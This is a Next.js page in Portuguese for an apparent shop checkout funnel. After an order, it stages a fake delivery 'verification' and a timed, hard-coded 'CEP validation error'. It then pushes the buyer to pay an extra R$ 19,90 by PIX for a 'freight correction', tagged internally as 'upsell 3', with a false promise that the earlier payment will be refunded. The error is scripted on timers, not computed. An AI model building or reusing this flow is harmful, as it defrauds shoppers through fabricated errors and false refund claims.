"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import PaymentLoadingOverlay from "../../components/PaymentLoadingOverlay";

const O = "#011843";
const OD = "#000d26";
const OL = "#f8efec";
const OM = "#e9dfe0";
const TD = "#201a1b";
const TM = "#71686a";
const TL = "#71686a";
const BG = "#faf8f7";
const RED = "#bd2c3b";
const REDL = "#fdeef0";
const GREEN = "#167555";
const GREENL = "#edf8f4";

export default function FretePage() {
  const router = useRouter();
  const [phase, setPhase] = useState<"verification" | "error">("verification");
  const [progressWidth, setProgressWidth] = useState(0);
  const [box1, setBox1] = useState(false);
  const [box2, setBox2] = useState(false);
  const [box3, setBox3] = useState(false);
  const [isProcessingPayment, setIsProcessingPayment] = useState(false);
  const box3Ref = useRef<HTMLDivElement>(null);

  const handlePagarFrete = async () => {
    const storedOrderData = sessionStorage.getItem("orderData")
    if (!storedOrderData) {
      alert("Dados do pedido não encontrados. Faça a compra novamente.")
      return
    }

    setIsProcessingPayment(true)

    try {
      const orderData = JSON.parse(storedOrderData)

      const response = await fetch("/api/pix/generate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          nome: orderData.nome,
          email: orderData.email || "",
          cpf: orderData.cpf,
          phone: orderData.phone || "",
          valor: 19.90,
          descricao: "upsell 3",
        }),
      })

      const data = await response.json()

      if (!response.ok || !data.success) {
        throw new Error(data.error || "Erro ao criar pagamento PIX")
      }

      const pixPaymentData = {
        transactionId: data.transactionId || null,
        identifier: data.identifier || null,
        copyPaste: data.copyPaste || null,
        qrCodeImage: data.qrCodeImage || null,
        status: data.status || "PENDING",
        acquirerSlug: data.acquirerSlug || "blackpay",
        rawResponse: data.rawResponse || JSON.stringify(data).slice(0, 1000),
      }

      sessionStorage.setItem("pixPaymentData", JSON.stringify(pixPaymentData))
      sessionStorage.setItem("acquirerSlug", data.acquirerSlug || "blackpay")
      sessionStorage.setItem("funnelNext", "https://www.google.com")
      sessionStorage.setItem("paymentContext", JSON.stringify({
        type: "upsell",
        title: "Correção de Frete",
        value: "R$ 19,90",
        icon: "🚚",
      }))
      router.push("/payment")
    } catch (error: any) {
      console.error("[Frete] Erro ao processar pagamento:", error)
      alert(error.message || "Erro ao processar pagamento. Tente novamente.")
      setIsProcessingPayment(false)
    }
  }

  useEffect(() => {
    const barStart = setTimeout(() => setProgressWidth(100), 100);

    const phaseSwitch = setTimeout(() => {
      setPhase("error");
      setBox1(true);
      setTimeout(() => setBox2(true), 5000);
      setTimeout(() => {
        setBox3(true);
        setTimeout(() => box3Ref.current?.scrollIntoView({ behavior: "smooth", block: "start" }), 300);
      }, 10000);
    }, 5000);

    return () => { clearTimeout(barStart); clearTimeout(phaseSwitch); };
  }, []);

  return (
    <div style={{ fontFamily: "'Poppins', sans-serif", backgroundColor: BG, minHeight: "100vh" }}>

      {/* Header */}
      <div style={{ background: `linear-gradient(135deg, ${OD}, ${O})`, padding: "16px 20px" }}>
        <div style={{ maxWidth: "520px", margin: "0 auto", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <a href="/">
            <img src="/images/oILg2cf6VMfI.png" alt="Triunfo Home Design" style={{ height: 32, display: "block" }} />
          </a>
          <div style={{ backgroundColor: "rgba(255,255,255,0.2)", borderRadius: "8px", padding: "6px 12px" }}>
            <p style={{ color: "rgba(255,255,255,0.7)", fontSize: "10px", margin: 0 }}>Pedido</p>
            <p style={{ color: "white", fontWeight: 700, fontSize: "13px", margin: 0 }}>#00044792</p>
          </div>
        </div>
      </div>

      <div style={{ maxWidth: "520px", margin: "0 auto", padding: "20px 16px" }}>

        {/* ─── Tela de verificação ─── */}
        {phase === "verification" && (
          <div style={{ animation: "fadeInUpSmooth 0.6s ease" }}>
            {/* Card principal */}
            <div style={{
              backgroundColor: "white",
              borderRadius: "20px",
              boxShadow: "0 4px 24px rgba(0,0,0,0.09)",
              overflow: "hidden",
              border: "1px solid #e5e7eb",
              marginBottom: "16px",
            }}>
              {/* Ícone + texto */}
              <div style={{ padding: "32px 24px 24px", textAlign: "center" }}>
                <div style={{
                  width: "72px", height: "72px", borderRadius: "50%",
                  background: `linear-gradient(135deg, ${OL}, ${OM})`,
                  border: `2px solid ${OM}`, margin: "0 auto 16px",
                  display: "flex", alignItems: "center", justifyContent: "center",
                }}>
                  <span style={{ fontSize: "34px" }}>📦</span>
                </div>
                <h1 style={{ fontSize: "20px", fontWeight: 800, color: TD, margin: "0 0 8px" }}>
                  Pedido Confirmado!
                </h1>
                <p style={{ fontSize: "14px", color: TL, margin: "0 0 28px", lineHeight: "1.6" }}>
                  Estamos verificando os dados da entrega para sua região...
                </p>

                {/* Barra de progresso laranja */}
                <div style={{ width: "100%", height: "10px", backgroundColor: "#e5e7eb", borderRadius: "999px", overflow: "hidden", position: "relative" }}>
                  <div style={{
                    width: `${progressWidth}%`,
                    height: "100%",
                    background: `linear-gradient(90deg, ${O}, ${OD})`,
                    borderRadius: "999px",
                    position: "absolute",
                    top: 0, left: 0,
                    transition: "width 5s linear",
                    boxShadow: `0 0 12px rgba(234,88,12,0.5)`,
                  }}>
                    <div style={{
                      position: "absolute", top: 0, right: "-10px",
                      height: "100%", width: "20px",
                      background: "linear-gradient(to right, transparent, rgba(255,255,255,0.5), transparent)",
                      animation: "shine 1.5s infinite linear",
                    }} />
                  </div>
                </div>
                <p style={{ fontSize: "12px", color: TL, marginTop: "10px" }}>Por favor, aguarde...</p>
              </div>

              {/* Steps indicadores */}
              <div style={{ borderTop: "1px solid #f3f4f6", padding: "16px 20px", display: "flex", justifyContent: "space-around" }}>
                {["Pedido", "Separação", "Frete", "Envio"].map((label, i) => (
                  <div key={i} style={{ textAlign: "center" }}>
                    <div style={{
                      width: "32px", height: "32px", borderRadius: "50%", margin: "0 auto 6px",
                      backgroundColor: i === 0 ? GREEN : i < 2 ? O : "#e5e7eb",
                      display: "flex", alignItems: "center", justifyContent: "center",
                    }}>
                      <span style={{ color: "white", fontSize: "13px", fontWeight: 700 }}>
                        {i === 0 ? "✓" : i + 1}
                      </span>
                    </div>
                    <p style={{ fontSize: "10px", color: i < 2 ? TM : TL, fontWeight: i < 2 ? 600 : 400, margin: 0 }}>{label}</p>
                  </div>
                ))}
              </div>
            </div>

            {/* Info extra */}
            <div style={{ backgroundColor: OL, border: `1px solid ${OM}`, borderRadius: "12px", padding: "14px 16px", display: "flex", gap: "10px" }}>
              <span style={{ fontSize: "16px", flexShrink: 0 }}>ℹ️</span>
              <p style={{ fontSize: "13px", color: OD, margin: 0, lineHeight: "1.6" }}>
                Esse processo leva alguns instantes. Não feche essa página — você receberá uma confirmação em breve.
              </p>
            </div>
          </div>
        )}

        {/* ─── Tela de erro / boxes sequenciais ─── */}
        {phase === "error" && (
          <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>

            {/* Box 1 — Pedido confirmado ✅ */}
            {box1 && (
              <div style={{
                backgroundColor: "white",
                borderRadius: "16px",
                boxShadow: "0 2px 16px rgba(0,0,0,0.08)",
                overflow: "hidden",
                border: "1px solid #bbf7d0",
                animation: "fadeInUpSmooth 0.8s ease forwards",
              }}>
                <div style={{ backgroundColor: GREENL, padding: "14px 20px", display: "flex", alignItems: "center", gap: "12px", borderBottom: "1px solid #bbf7d0" }}>
                  <span style={{ fontSize: "24px" }}>✅</span>
                  <div>
                    <p style={{ fontSize: "14px", fontWeight: 700, color: GREEN, margin: "0 0 2px" }}>Pedido Confirmado</p>
                    <p style={{ fontSize: "12px", color: TL, margin: 0 }}>Etapa 1 concluída com sucesso</p>
                  </div>
                </div>
                <div style={{ padding: "14px 20px" }}>
                  <p style={{ fontSize: "13px", color: TM, margin: 0, lineHeight: "1.6" }}>
                    Seu pedido foi processado e confirmado. Estamos verificando as próximas etapas...
                  </p>
                </div>
              </div>
            )}

            {/* Box 2 — Validação CEP ❌ */}
            {box2 && (
              <div style={{
                backgroundColor: "white",
                borderRadius: "16px",
                boxShadow: "0 2px 16px rgba(0,0,0,0.08)",
                overflow: "hidden",
                border: "1px solid #fecaca",
                animation: "fadeInUpSmooth 0.8s ease forwards",
              }}>
                <div style={{ backgroundColor: REDL, padding: "14px 20px", display: "flex", alignItems: "center", gap: "12px", borderBottom: "1px solid #fecaca" }}>
                  <span style={{ fontSize: "24px" }}>❌</span>
                  <div>
                    <p style={{ fontSize: "14px", fontWeight: 700, color: RED, margin: "0 0 2px" }}>Erro na Validação do CEP</p>
                    <p style={{ fontSize: "12px", color: TL, margin: 0 }}>Verificando inconsistência no frete</p>
                  </div>
                </div>
                <div style={{ padding: "14px 20px" }}>
                  <p style={{ fontSize: "13px", color: TM, margin: 0, lineHeight: "1.6" }}>
                    Identificamos uma inconsistência no cálculo de frete para a sua região. Analisando os dados...
                  </p>
                </div>
              </div>
            )}

            {/* Box 3 — CTA de pagamento */}
            {box3 && (
              <div
                ref={box3Ref}
                style={{
                  backgroundColor: "white",
                  borderRadius: "16px",
                  boxShadow: "0 4px 24px rgba(0,0,0,0.12)",
                  overflow: "hidden",
                  border: `2px solid ${OM}`,
                  animation: "fadeInUpSmooth 0.8s ease forwards",
                }}
              >
                {/* Header laranja */}
                <div style={{
                  background: `linear-gradient(135deg, ${OD}, ${O})`,
                  padding: "18px 20px",
                  display: "flex",
                  alignItems: "center",
                  gap: "14px",
                }}>
                  <div style={{ width: "46px", height: "46px", backgroundColor: "rgba(255,255,255,0.2)", borderRadius: "12px", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                    <span style={{ fontSize: "24px" }}>🚚</span>
                  </div>
                  <div>
                    <p style={{ color: "white", fontWeight: 800, fontSize: "15px", margin: "0 0 2px" }}>Correção de Frete Necessária</p>
                    <p style={{ color: "rgba(255,255,255,0.8)", fontSize: "12px", margin: 0 }}>Ação obrigatória para liberar envio</p>
                  </div>
                </div>

                <div style={{ padding: "20px" }}>
                  <p style={{ fontSize: "14px", color: TM, lineHeight: "1.7", margin: "0 0 16px" }}>
                    O valor do frete foi <strong style={{ color: RED }}>calculado incorretamente</strong> para a sua região.
                    Sem a correção, o pedido <strong style={{ color: TD }}>não será enviado</strong>.
                  </p>

                  {/* Info box */}
                  <div style={{
                    backgroundColor: OL,
                    border: `1px solid ${OM}`,
                    borderLeft: `4px solid ${O}`,
                    borderRadius: "10px",
                    padding: "14px 16px",
                    marginBottom: "20px",
                    display: "flex",
                    gap: "10px",
                  }}>
                    <span style={{ fontSize: "16px", flexShrink: 0 }}>💡</span>
                    <p style={{ fontSize: "13px", color: OD, margin: 0, lineHeight: "1.6" }}>
                      Realize o pagamento correto do frete e o pedido será despachado imediatamente.
                      O valor pago anteriormente será <strong>reembolsado integralmente</strong>.
                    </p>
                  </div>

                  {/* Detalhe do valor */}
                  <div style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    backgroundColor: BG,
                    borderRadius: "10px",
                    padding: "14px 16px",
                    marginBottom: "20px",
                    border: "1px solid #e5e7eb",
                  }}>
                    <div>
                      <p style={{ fontSize: "12px", color: TL, margin: "0 0 4px" }}>Correção de frete</p>
                      <p style={{ fontSize: "11px", color: TL, margin: 0 }}>Pagamento único</p>
                    </div>
                    <div style={{ textAlign: "right" }}>
                      <p style={{ fontSize: "22px", fontWeight: 800, color: O, margin: 0 }}>R$ 19,90</p>
                      <p style={{ fontSize: "11px", color: TL, margin: 0 }}>Pagamento único</p>
                    </div>
                  </div>

                  {/* Botão CTA */}
                  <button
                    onClick={handlePagarFrete}
                    disabled={isProcessingPayment}
                    style={{
                      display: "block",
                      width: "100%",
                      padding: "17px",
                      background: isProcessingPayment ? "#9ca3af" : `linear-gradient(135deg, ${O}, ${OD})`,
                      color: "white",
                      fontWeight: 700,
                      fontSize: "15px",
                      borderRadius: "12px",
                      border: "none",
                      textAlign: "center",
                      fontFamily: "'Poppins', sans-serif",
                      boxShadow: isProcessingPayment ? "none" : `0 4px 18px rgba(234,88,12,0.45)`,
                      animation: isProcessingPayment ? "none" : "pulse 1.8s infinite",
                      letterSpacing: "0.5px",
                      boxSizing: "border-box",
                      marginBottom: "10px",
                      cursor: isProcessingPayment ? "not-allowed" : "pointer",
                    }}
                  >
                    🚚 CORRIGIR FRETE E LIBERAR ENVIO
                  </button>

                  <p style={{ fontSize: "12px", color: TL, textAlign: "center", margin: 0 }}>
                    🔒 Pagamento seguro · Valor anterior reembolsado
                  </p>
                </div>
              </div>
            )}
          </div>
        )}
      </div>
      {isProcessingPayment && (
        <PaymentLoadingOverlay
          title="Preparando seu PIX..."
          subtitle="Aguarde enquanto geramos seu código de pagamento"
          isUpsell
        />
      )}
      <style>{`
        @keyframes fadeInUpSmooth {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.03); }
        }
        @keyframes shine {
          from { transform: translateX(-100%); }
          to { transform: translateX(200%); }
        }
      `}</style>
    </div>
  );
}
